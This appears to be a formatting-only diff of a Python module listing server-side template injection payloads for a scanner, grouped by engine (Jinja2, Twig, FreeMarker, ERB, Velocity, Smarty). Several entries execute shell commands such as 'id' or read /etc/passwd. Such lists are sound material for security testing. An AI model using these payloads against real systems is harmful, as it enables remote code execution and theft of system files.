@@ -2,55 +2,49 @@
 
 SSTI_PAYLOADS = [
     # Jinja2 / Django
-    '{{7*7}}',
-    '{{config}}',
-    '{{self._TemplateReference__context}}',
+    "{{7*7}}",
+    "{{config}}",
+    "{{self._TemplateReference__context}}",
     "{{''.__class__.__mro__[2].__subclasses__()}}",
-
     # Twig / PHP
-    '{{7*7}}',
+    "{{7*7}}",
     '{{_self.env.registerUndefinedFilterCallback("exec")}}',
     '{{_self.env.getFilter("cat /etc/passwd")}}',
-
     # FreeMarker / Java
-    '${7*7}',
-    '${7*7}',
+    "${7*7}",
+    "${7*7}",
     '${"freemarker.template.utility.Execute"?new()("id")}',
-
     # ERB / Ruby
-    '<%= 7*7 %>',
+    "<%= 7*7 %>",
     '<%= system("id") %>',
     '<%= File.open("/etc/passwd").read %>',
-
     # Velocity / Java
-    '#set($x=7*7)$x',
-    '#set($x=$class.inspect)$x',
-
+    "#set($x=7*7)$x",
+    "#set($x=$class.inspect)$x",
     # Smarty / PHP
-    '{7*7}',
+    "{7*7}",
     '{system("id")}',
     '{php}echo "test";{/php}',
-
     # Generic
-    '${7*7}',
-    '#{7*7}',
-    '*{7*7}',
+    "${7*7}",
+    "#{7*7}",
+    "*{7*7}",
 ]
 
 FRAMEWORK_SSTI_PAYLOADS = {
     "jinja2": [
-        '{{7*7}}',
+        "{{7*7}}",
         '{{"".__class__}}',
     ],
     "django": [
-        '{{7*7}}',
-        '{{request.user}}',
+        "{{7*7}}",
+        "{{request.user}}",
     ],
     "twig": [
-        '{{7*7}}',
+        "{{7*7}}",
     ],
     "freemarker": [
-        '${7*7}',
+        "${7*7}",
     ],
 }
 
